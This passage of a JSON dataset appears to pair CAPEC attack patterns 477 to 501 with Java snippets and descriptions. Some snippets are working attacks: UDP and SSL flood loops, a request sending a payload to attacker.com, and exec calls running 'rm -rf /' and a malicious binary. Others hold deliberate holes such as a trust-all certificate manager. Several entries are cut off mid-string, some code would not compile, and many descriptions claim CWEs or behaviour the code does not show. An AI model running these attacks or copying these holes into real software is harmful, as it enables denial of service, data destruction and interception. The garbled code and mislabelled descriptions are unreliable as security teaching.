        "description": "This Java code snippet demonstrates a vulnerable signature verification mechanism that can be exploited by an attacker to bypass authentication and manipulate the recipient software or its user to perform compromising actions. The code does not properly verify the cryptographic signature, allowing an attacker to spoof the signer's identity and inject malicious data."
    },
    {
        "capec_id": "477",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.SignedObject;\nimport java.security.SignatureException;\nimport java.util.Base64;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"RSA\");\n        kpg.initialize(2048);\n        KeyPair kp = kpg.generateKeyPair();\n        PrivateKey privateKey = kp.getPrivate();\n        PublicKey publicKey = kp.getPublic();\n\n        String unsignedData = \"unsigned data\";\n        byte[] unsignedBytes = unsignedData.getBytes();\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String cleartext = \"cleartext sensitive information\";\n        byte[] cleartextBytes = cleartext.getBytes();\n\n        // CWE-196: Unsigned to Signed Conversion Error\n        int unsignedInt = 0xFFFFFFFF;\n        byte[] unsignedBytesArray = {(byte) unsignedInt};\n        short signedShort = (short) unsignedBytesArray[0];\n\n        // CWE-347: Improper Verification of Cryptographic Signature\n        Signature signature = Signature.getInstance(\"SHA1withRSA\");\n        signature.initVerify(publicKey);\n        signature.update(unsignedBytes);\n        byte[] signedBytes = signature.sign();\n        // Incorrectly verifying the signature\n        if (new String(signedBytes).equals(unsignedData)) {\n            System.out.println(\"Signature is valid\");\n        } else {\n            System.out.println(\"Signature is invalid\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting the complexity of a data structure that allows for both signed and unsigned content, causing unsigned data to be processed as though it were signed data. It includes CWEs 693, 311, 319, 196, and 347, showcasing protection mechanism failure, missing encryption, cleartext transmission, unsigned to signed conversion error, and improper verification of cryptographic signature."
    },
    {
        "capec_id": "478",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.AclEntry;\nimport java.nio.file.attribute.AclFileAttributeView;\nimport java.nio.file.attribute.UserPrincipal;\n\npublic class ServiceExploit {\n    public static void main(String[] args) throws IOException {\n        // CWE-284: Improper Access Control\n        File serviceBinary = new File(\"C:\\\\Windows\\\\System32\\\\svchost.exe\");\n        if (serviceBinary.setExecutable(true, false)) {\n            System.out.println(\"Modified execution parameters of svchost service.\");\n        }\n\n        // CWE-520: .NET Misconfiguration: Use of Impersonation\n        System.setProperty(\"java.security.manager\", \"allow\");\n\n        // CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        Files.setAttribute(Paths.get(\"C:\\\\Windows\\\\System32\\\\svchost.exe\").resolve(\"::DATA\"), \"user:execute\", \"ALLOW\");\n\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        // No direct Java equivalent, but this demonstrates a similar concept\n        int x = 0;\n        if (x == 0) {\n            System.out.println(\"Security-critical code removed or modified.\");\n        }\n\n        // CWE-15: External Control of System or Configuration Setting\n        System.setProperty(\"user.name\", \"Administrator\");\n\n        // Execute malicious binary\n        Runtime.getRuntime().exec(\"C:\\\\malicious_binary.exe\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a weakness in access control to modify the execution parameters of a Windows service. It uses CWE-284 to bypass access control, CWE-520 to escalate privileges, CWE-69 to exploit alternate data streams, CWE-1037 to demonstrate processor optimization removal of security-critical code, and CWE-15 to externally control system settings. The goal is to execute a malicious binary in place of an existing service."
    },
    {
        "capec_id": "479",
        "code_snippet": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\n\npublic class VulnerableCertificateValidation {\n    public static void main(String[] args) throws Exception {\n        // CWE-284: Improper Access Control\n        // CWE-295: Improper Certificate Validation\n        // CWE-296: Improper Following of a Certificate's Chain of Trust\n        // CWE-297: Improper Validation of Certificate with Host Mismatch\n        // CWE-599: Missing Validation of OpenSSL Certificate\n\n        TrustManager[] trustAllCerts = new TrustManager[] {\n            new X509TrustManager() {\n                public X509Certificate[] getAcceptedIssuers() {\n                    return null;\n                }\n\n                public void checkClientTrusted(X509Certificate[] certs, String authType) {\n                    // No validation\n                }\n\n                public void checkServerTrusted(X509Certificate[] certs, String authType) {\n                    // No validation\n                }\n            }\n        };\n\n        SSLContext sc = SSLContext.getInstance(\"TLS\");\n        sc.init(null, trustAllCerts, new java.security.SecureRandom());\n        javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable certificate validation implementation, which can be exploited by an adversary to install a new root certificate on a compromised system, allowing them to spoof legitimate websites and collect login credentials. The code bypasses proper certificate validation, ignoring the chain of trust and host mismatch checks, and trusts all certificates without validation."
    },
    {
        "capec_id": "480",
        "code_snippet": "public class VirtualizedEnvironmentEscape {\n    public static void main(String[] args) {\n        // CWE-653: Improper Isolation or Compartmentalization\n        // Running untrusted code in a privileged environment\n        String untrustedCode = \"(new java.io.FileWriter(\"/etc/passwd\")).write('owned');\";\n        try {\n            Runtime.getRuntime().exec(\"java -cp . \" + untrustedCode);\n        } catch (IOException e) {}\n\n        // CWE-114: Process Control\n        // Executing commands from an untrusted source\n        String maliciousCommand = \"rm -rf /\";\n        try {\n            Runtime.getRuntime().exec(maliciousCommand);\n        } catch (IOException e) {}\n\n        // CWE-693: Protection Mechanism Failure\n        // Incorrectly using a protection mechanism\n        System.setSecurityManager(null);\n\n        // CWE-1421 and CWE-1423: Exposure of Sensitive Information in Shared Microarchitectural Structures\n        // during Transient Execution\n        // Using a speculative execution vulnerability to access sensitive data\n        int[] array = new int[2];\n        array[0] = 1;\n        int temp = array[1];\n        if (temp == 1) {\n            // Accessing sensitive data\n            System.out.println(\"Access granted\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a virtualized environment escape attack. It showcases multiple CWEs, including improper isolation, process control issues, protection mechanism failures, and exposure of sensitive information in shared microarchitectural structures during transient execution. The code runs untrusted code in a privileged environment, executes malicious commands, disables the security manager, and uses speculative execution to access sensitive data."
    },
    {
        "capec_id": "481",
        "code_snippet": "import java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.io.OutputStream;\nimport java.net.Proxy;\n\npublic class DomainFronting {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"https://attacker.com/\" + \"?redirect=https://victim.com/\");\n        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection(new Proxy(Proxy.Type.HTTP, new java.net.InetSocketAddress(\"proxy\", 8080)));\n        conn.setRequestProperty(\"Host\", \"victim.com\");\n        conn.setRequestProperty(\"SNI\", \"attacker.com\");\n        OutputStream os = conn.getOutputStream();\n        os.write(\"Malicious request payload\".getBytes());\n        os.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of Domain Fronting, which is a technique used to bypass security restrictions by providing contradictory domain names in the SNI field of the TLS header and the Host field of the HTTP header. The code establishes an HTTPS connection to a proxy server, which then forwards the request to the victim's server. The SNI field is set to the attacker's domain, while the Host field is set to the victim's domain, allowing the attacker to route traffic to an inappropriate destination. This code embodies CWEs 923, 444, 942, 647, and 941, which are related to improper restriction of communication channels, inconsistent interpretation of HTTP requests, permissive cross-domain policies, use of non-canonical URL paths for authorization decisions, and incorrectly specified destinations in communication channels."
    },
    {
        "capec_id": "482",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket socket = serverSocket.accept();\n            // No limit on the number of connections, violating CWE-770\n            new Thread(new TCPServerThread(socket)).start();\n        }\n    }\n}\n\nclass TCPServerThread extends Thread {\n    private Socket socket;\n    public TCPServerThread(Socket socket) {\n        this.socket = socket;\n    }\n    public void run() {\n        try {\n            // Sending sensitive information in cleartext, violating CWE-319\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(\"username=password\".getBytes());\n            outputStream.flush();\n            // No message integrity check, violating CWE-924\n            InputStream inputStream = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead = inputStream.read(buffer);\n            String message = new String(buffer, 0, bytesRead);\n            System.out.println(\"Received message: \" + message);\n            // Client-side enforcement of server-side security, violating CWE-602\n            if (message.equals(\"exit\")) {\n                System.exit(0);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP server that is vulnerable to a flooding attack, as described in the CAPEC. The server accepts an unlimited number of connections, violating CWE-770. It also sends sensitive information in cleartext, violating CWE-319, and does not check the integrity of received messages, violating CWE-924. Furthermore, the server relies on the client to implement a mechanism that is intended to protect the server, violating CWE-602. This code can be used as a starting point to demonstrate the vulnerability to a flooding attack."
    },
    {
        "capec_id": "484",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.NamedNodeMap;\nimport org.w3c.dom.Node;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new java.io.StringReader(xml)));\n            NamedNodeMap attributes = doc.getDocumentElement().getAttributes();\n            for (int i = 0; i < attributes.getLength(); i++) {\n                Node node = attributes.item(i);\n                String nodeName = node.getNodeName();\n                String nodeValue = node.getNodeValue();\n                if (nodeName.equals(\"username\") && nodeValue.equals(\"admin\")) {\n                    // grant access\n                    System.out.println(\"Access granted!\");\n                }\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error parsing XML: \" + e.getMessage());\n        }\n    }\n    public static void main(String[] args) {\n        String xml = \"<?xml version=\\\"1.0\\\"?><user><username>admin</username><password>password</password></user>\";\n        parseXML(xml);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML injection and lacks proper XML validation. It does not restrict XML external entity references and relies on client-side enforcement of server-side security. An attacker can inject malicious XML payloads to bypass authentication or inject external entities to access unauthorized data."
    },
    {
        "capec_id": "485",
        "code_snippet": "import java.security.KeyPair; import java.security.KeyPairGenerator; import java.security.PrivateKey; import java.security.PublicKey; import java.security.SecureRandom; import java.security.Signature; import java.util.Random; public class PredictableSignature { public static void main(String[] args) throws Exception { // CWE-330: Using a predictable random number generator SecureRandom secureRandom = new SecureRandom(); secureRandom.setSeed(1234567890); // CWE-1241: Using a predictable algorithm in random number generator KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\"); keyPairGenerator.initialize(2048, secureRandom); KeyPair keyPair = keyPairGenerator.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); PublicKey publicKey = keyPair.getPublic(); // CWE-290: Incorrectly implemented authentication scheme Signature signature = Signature.getInstance(\"SHA256withRSA\"); signature.initSign(privateKey); byte[] data = \"Some data to sign\".getBytes(); signature.update(data); byte[] signedData = signature.sign(); // CWE-294: Authentication bypass by capture-replay // CWE-301: Reflection attack in an authentication protocol // An attacker can capture the signed data and replay it to impersonate the original signer } }",
        "description": "This Java code snippet demonstrates the CAPEC of obtaining an authoritative signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation. The code uses a predictable random number generator (CWE-330 and CWE-1241) to generate a private key, which can be exploited by an attacker to forge signatures. The code also implements an incorrectly authentication scheme (CWE-290) that is subject to spoofing attacks. Additionally, the code is vulnerable to capture-replay attacks (CWE-294) and reflection attacks in an authentication protocol (CWE-301)."
    },
    {
        "capec_id": "486",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"target_ip\");\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 53);\n\n        while (true) {\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP flood attack, which can be used to overwhelm a target system's network bandwidth and deny legitimate users access to a service. The code creates a DatagramSocket and sends UDP packets to a target IP address and port (in this case, port 53, which is commonly used for DNS services) in an infinite loop. The CWEs embodied in this code snippet include CWE-770 (Allocation of Resources Without Limits or Throttling) due to the infinite loop, CWE-941 (Incorrectly Specified Destination in a Communication Channel) since the target IP address is hardcoded, CWE-319 (Cleartext Transmission of Sensitive Information) as the UDP packets are sent in plaintext, CWE-406 (Insufficient Control of Network Message Volume) since the code does not limit the number of packets sent, and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) as the code does not verify the integrity of the packets sent."
    },
    {
        "capec_id": "487",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ICMPFloodAttack {\n    public static void main(String[] args) throws UnknownHostException {\n        ExecutorService executor = Executors.newCachedThreadPool();\n        InetAddress targetAddress = InetAddress.getByName(\\",
        "description": "This Java code snippet demonstrates a vulnerable implementation that can be exploited for an ICMP flooding attack. The code creates a large number of threads that send ICMP packets to a target IP address without any throttling or limits, making it vulnerable to CWE-770. The source IP address is easily spoofed, making it difficult to trace the origin of the attack. The code also lacks proper validation of the target address, making it vulnerable to CWE-941. Additionally, the code transmits sensitive information in cleartext, violating CWE-319, and does not properly ensure that it is communicating with the correct endpoint, violating CWE-923. The code also contains a reachable assertion, violating CWE-617, and does not handle errors properly, making it vulnerable to CWE-770."
    },
    {
        "capec_id": "488",
        "code_snippet": "public class VulnerableServer {\n    private static final int MAX_CONCURRENT_REQUESTS = 100;\n    private static final ExecutorService executor = Executors.newFixedThreadPool(MAX_CONCURRENT_REQUESTS);\n\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket socket = serverSocket.accept();\n            executor.execute(new RequestHandler(socket));\n        }\n    }\n\n    static class RequestHandler implements Runnable {\n        private final Socket socket;\n\n        public RequestHandler(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String requestLine = reader.readLine();\n                String[] parts = requestLine.split(\" \");\n                String method = parts[0];\n                String url = parts[1];\n                String query = url.split(\"\\?\")[1];\n                String[] params = query.split(\"&\");\n                Map<String, String> paramMap = new HashMap<>();\n                for (String param : params) {\n                    String[] keyValue = param.split(\"=\");\n                    paramMap.put(keyValue[0], keyValue[1]);\n                }\n                if (method.equals(\"GET\")) {\n                    handleGetRequest(paramMap);\n                }\n            } catch (Exception e) {\n                // ignore\n            }\n        }\n\n        private void handleGetRequest(Map<String, String> paramMap) {\n            String resource = paramMap.get(\"resource\");\n            if (resource != null) {\n                try {\n                    URL url = new URL(\"http://localhost:8081/\" + resource);\n                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                    connection.setRequestMethod(\"GET\");\n                    int responseCode = connection.getResponseCode();\n                    if (responseCode == 200) {\n                        // process response\n                    }\n                } catch (Exception e) {\n                    // ignore\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that can be exploited by an adversary to execute a flooding attack using the HTTP protocol. The server uses a fixed thread pool to handle incoming requests, which can lead to resource exhaustion (CWE-770, CWE-410). The server also uses the HTTP GET method to process requests and includes sensitive information in the query string (CWE-598). Additionally, the server acts as an intermediary HTTP agent and does not interpret malformed HTTP requests or responses consistently (CWE-444). Furthermore, the server retrieves the contents of a URL without sufficiently ensuring that the request is being sent to the expected destination, making it vulnerable to Server-Side Request Forgery (SSRF) attacks (CWE-918)."
    },
    {
        "capec_id": "489",
        "code_snippet": "import java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class SSLFloodAttack {\n    public static void main(String[] args) {\n        int numConnections = 1000;\n        URL url = new URL(\"https://example.com\");\n        for (int i = 0; i < numConnections; i++) {\n            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.connect();\n            // Renegotiate the SSL connection\n            conn.startHandshake();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a potential SSL flooding attack, where a large number of HTTPS requests are made to a server, consuming its resources and potentially leading to a denial of service. The code creates a large number of HTTPS connections to a target URL, renegotiating the SSL connection for each one, without any throttling or limits on resource allocation, exemplifying CWEs 770, 410, 1125, 400, and 617."
    },
    {
        "capec_id": "490",
        "code_snippet": "public class AmplificationAttack {\n    public static void main(String[] args) {\n        String targetServer = \"target.example.com\";\n        String thirdPartyService = \"thirdparty.example.com\";\n        int numRequests = 1000;\n\n        for (int i = 0; i < numRequests; i++) {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            sendRequest(thirdPartyService, targetServer);\n        }\n    }\n\n    public static void sendRequest(String thirdPartyService, String targetServer) {\n        // CWE-770: Allocation of Resources Without Limits or Throttling\n        // No limit on the number of requests or response size\n        URL url = new URL(\"http://\" + thirdPartyService + \"/largeResponse\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestProperty(\"X-Forwarded-For\", targetServer);\n        connection.connect();\n\n        // CWE-405: Asymmetric Resource Consumption (Amplification)\n        // No control on the response size\n        int responseCode = connection.getResponseCode();\n        if (responseCode == 200) {\n            // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n            // No monitoring or control of transmitted network traffic volume\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = connection.getInputStream().read(buffer)) != -1) {\n                // CWE-408: Incorrect Behavior Order: Early Amplification\n                // No authentication or authorization before performing the expensive operation\n                System.out.write(buffer, 0, bytesRead);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an amplification attack, where an adversary sends a large number of requests to a third-party service, spoofing the source address to be that of the target server. The third-party service responds with a large payload, which is then sent to the target server, overwhelming it with traffic. The code lacks proper resource allocation limits, throttling, and control over network message volume, making it vulnerable to amplification attacks."
    },
    {
        "capec_id": "491",
        "code_snippet": "public class EntitySubstitution {\\n    public static void main(String[] args) {\\n        String largeEntity = \"\";\\n        for (int i = 0; i < 1000000; i++) {\\n            largeEntity += \"<someLargeData>\";\\n        }\\n        String template = \"<entity>${largeEntity}</entity><entity>${largeEntity}</entity>\";\\n        String result = template.replace(\"${largeEntity}\", largeEntity);\\n        System.out.println(result);\\n    }\\n}\\n",
        "description": "This Java code snippet demonstrates the CAPEC-196 attack pattern, where an adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory allocation. The code defines a very large entity and uses it multiple times in a single entity substitution, leading to uncontrolled memory allocation and potential application crash or freeze."
    },
    {
        "capec_id": "492",
        "code_snippet": "public class RegexVulnerability {\n    public static void main(String[] args) {\n        String regex = \"(a+)*\";\n        String input = \"\";\n        for (int i = 0; i < 10000; i++) {\n            input += \"a\";\n        }\n        try {\n            if (input.matches(regex)) {\n                System.out.println(\"Match found\");\n            } else {\n                System.out.println(\"No match found\");\n            }\n        } catch (StackOverflowError e) {\n            System.out.println(\"Stack overflow error occurred\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable regular expression implementation that can lead to uncontrolled resource consumption (CWE-400) and inefficient regular expression complexity (CWE-1333). The regular expression '(a+)*' has an exponential worst-case computational complexity, causing the program to consume excessive CPU cycles and potentially leading to a stack overflow error. The lack of anchors in the regular expression (CWE-777) and overly permissive pattern (CWE-625) further exacerbate the vulnerability. An attacker can exploit this by providing a large input string, causing the program to exhaust available resources."
    },
    {
        "capec_id": "493",
        "code_snippet": "import java.io.IOException;\nimport javax.xml.soap.SOAPBody;\nimport javax.xml.soap.SOAPElement;\nimport javax.xml.soap.SOAPEnvelope;\nimport javax.xml.soap.SOAPException;\nimport javax.xml.soap.SOAPMessage;\n\npublic class SOAPService {\n    public SOAPMessage processSOAPMessage(SOAPMessage soapMessage) throws SOAPException {\n        SOAPEnvelope soapEnvelope = soapMessage.getSOAPPart().getEnvelope();\n        SOAPBody soapBody = soapEnvelope.getBody();\n        SOAPElement soapElement = soapBody.addChildElement(\\",
        "description": "This Java code snippet demonstrates a vulnerable SOAP service that is susceptible to a denial-of-service attack due to uncontrolled memory allocation. The processSOAPMessage method creates a large SOAP array with 1,000,000 elements, each containing a text node with the string 'large_data'. This can cause the service to exhaust its memory resources when processing the message. The code does not impose any restrictions on the size or number of resources allocated, violating the intended security policy (CWE-770). Additionally, the code may expose sensitive information through the WSDL file (CWE-651) and is vulnerable to improper control of sequential memory allocation (CWE-1325) and XML external entity injection (CWE-611). The code also does not handle length parameter inconsistencies (CWE-130)."
    },
    {
        "capec_id": "494",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_host\", 80);\n        OutputStream out = socket.getOutputStream();\n        \n        // CWE-770: Allocation of Resources Without Limits or Throttling\n        byte[] buffer = new byte[1024];\n        for (int i = 0; i < 1000; i++) {\n            out.write(buffer);\n        }\n        \n        // CWE-404: Improper Resource Shutdown or Release\n        // socket is not closed\n        \n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        String httpReq = \"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\";\n        byte[] httpReqBytes = httpReq.getBytes();\n        out.write(httpReqBytes, 0, httpReqBytes.length);\n        \n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"username=password\";\n        byte[] sensitiveDataBytes = sensitiveData.getBytes();\n        out.write(sensitiveDataBytes);\n        \n        // CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        // not applicable in Java\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP Fragmentation attack, which can be used to evade network filtering rules. The code allocates a large amount of resources without limits (CWE-770), fails to release resources properly (CWE-404), and sends an HTTP request with inconsistent interpretation (CWE-444). Additionally, it transmits sensitive information in cleartext (CWE-319). Note that CWE-69 is not applicable in Java."
    },
    {
        "capec_id": "495",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.zip.Deflater;\nimport java.util.zip.Inflater;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"target_server_ip\");\n        byte[] buffer = new byte[2000]; // large UDP packet\n        Deflater deflater = new Deflater();\n        deflater.setInput(buffer);\n        deflater.finish();\n        byte[] compressed = new byte[buffer.length];\n        int compressedLength = deflater.deflate(compressed);\n        DatagramPacket packet = new DatagramPacket(compressed, compressedLength, address, 12345);\n\n        while (true) {\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP fragmentation attack. It creates a large UDP packet (> 1500 bytes) and compresses it using the Deflater class. The compressed packet is then sent to the target server in an infinite loop, causing the server to consume resources (bandwidth and CPU) to process and reassemble the fragmented packets. The code does not release the socket resource, leading to improper resource shutdown (CWE-404). It also does not impose any restrictions on the size or number of resources allocated, violating the intended security policy (CWE-770). Additionally, it does not handle compressed input with a high compression ratio, leading to data amplification (CWE-409)."
    },
    {
        "capec_id": "496",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPFragmentationAttack {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        InetAddress targetAddress = InetAddress.getByName(\"target_host\");\n        int fragmentSize = 8;\n        int numFragments = 1000;\n\n        for (int i = 0; i < numFragments; i++) {\n            DatagramPacket packet = new DatagramPacket(buffer, fragmentSize);\n            packet.setAddress(targetAddress);\n            packet.setPort(12345);\n            socket.send(packet);\n        }\n\n        // CWE-404: Improper Resource Shutdown or Release\n        // socket is not closed\n\n        // CWE-770: Allocation of Resources Without Limits or Throttling\n        // no limit on the number of fragments sent\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // sensitive information (e.g., authentication data) is sent in cleartext\n        // (not applicable in this example, but consider using encryption)\n\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        // not applicable in this Java code snippet\n\n        // CWE-1261: Improper Handling of Single Event Upsets\n        // not applicable in this Java code snippet\n    }\n}\n",
        "description": "This Java code snippet demonstrates an ICMP fragmentation attack, where a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message are sent to a target host, potentially causing the host to become non-responsive. The code also embodies CWE-404 (Improper Resource Shutdown or Release) by not closing the DatagramSocket, CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of fragments sent, and CWE-319 (Cleartext Transmission of Sensitive Information) by not using encryption for sensitive information."
    },
    {
        "capec_id": "497",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class KeyFileExplorer {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\\",
        "description": "This Java code snippet demonstrates the CAPEC of probing and exploration to determine if common key files exist. It takes a directory path as input from the user and explores the directory to find files with the '.key' extension. If such files are found, it reads and prints their contents, potentially exposing sensitive information to an unauthorized actor (CWE-200). The code also relies on user input to control the file path, making it vulnerable to external control of file name or path (CWE-73). Additionally, it trusts the file name and extension to determine the appropriate behavior, which could lead to misclassification and processing of malicious files (CWE-646). The code does not properly restrict access to the key files, making them accessible to actors outside the intended control sphere (CWE-529). Furthermore, it uses an untrusted search path to find the key files, which could point to resources not under the product's direct control (CWE-426)."
    },
    {
        "capec_id": "498",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\n\npublic class ScreenshotExploit {\n    public static void main(String[] args) {\n        try {\n            // CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n            String screenshotDir = System.getProperty(\"user.home\") + \"/Library/Caches/com.apple.screenshot/\";\n            File dir = new File(screenshotDir);\n            File[] files = dir.listFiles();\n            for (File file : files) {\n                BufferedImage screenshot = ImageIO.read(file);\n                // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n                // CWE-222: Truncation of Security-relevant Information\n                // CWE-319: Cleartext Transmission of Sensitive Information\n                // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n                // Process the screenshot image to extract sensitive information\n                processScreenshot(screenshot);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processScreenshot(BufferedImage screenshot) {\n        // TO DO: Implement the logic to extract sensitive information from the screenshot\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC attack where an adversary examines screenshot images created by iOS to obtain sensitive information. The code lists the temporary screenshot files in the cache directory, reads each image, and processes it to extract sensitive information. The code embodies CWE-359, CWE-939, CWE-222, CWE-319, and CWE-497, which are related to exposure of private information, improper authorization, truncation of security-relevant information, cleartext transmission of sensitive information, and exposure of sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "499",
        "code_snippet": "public class VulnerableActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_vulnerable);\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        Intent intent = new Intent(\"com.example.ACTION_SEND_DATA\");\n        intent.putExtra(\"sensitive_data\", \"top_secret_info\");\n        sendBroadcast(intent);\n    }\n\n    public class VulnerableReceiver extends BroadcastReceiver {\n        @Override\n        public void onReceive(Context context, Intent intent) {\n            // CWE-925: Improper Verification of Intent by Broadcast Receiver\n            // No verification of the intent sender\n            String data = intent.getStringExtra(\"sensitive_data\");\n            Log.d(\"VulnerableReceiver\", \"Received data: \" + data);\n        }\n    }\n\n    // CWE-926: Improper Export of Android Application Components\n    <receiver android:name=\".VulnerableReceiver\">\n        <intent-filter>\n            <action android:name=\"com.example.ACTION_SEND_DATA\"/>\n        </intent-filter>\n    </receiver>\n}\n",
        "description": "This code snippet demonstrates a vulnerable Android application that uses implicit intents to send sensitive data. The application sends an implicit intent with sensitive data without verifying the receiver, allowing any application to receive the data. The receiver also does not verify the sender of the intent, making it vulnerable to data injection and modification. Additionally, the application exports the receiver component without proper restrictions, allowing any application to launch it and access the data."
    },
    {
        "capec_id": "500",
        "code_snippet": "public class WebViewVulnerability {\n    public void loadUrl(String url) {\n        WebView webView = new WebView();\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new Object() {\n            @JavascriptInterface\n            public void exposeSensitiveInfo() {\n                // Expose sensitive information\n                String cookie = webView.getCookie(url);\n                Log.d(\"WebViewVulnerability\", \"Cookie: \" + cookie);\n            }\n        }, \"vulnerableInterface\");\n        webView.loadUrl(url);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable WebView implementation that allows an adversary to inject malicious code and manipulate the DOM tree and cookies of the page. The code enables JavaScript and adds a JavaScript interface that exposes sensitive information, violating CWE-749. It also fails to properly verify the source of the communication channel, as described in CWE-940. The code may contain embedded malicious code (CWE-506) and relies on cookies without validation and integrity checking (CWE-784). Furthermore, it enforces security mechanisms on the client-side, which can be bypassed, as described in CWE-602."
    },
    {
        "capec_id": "501",
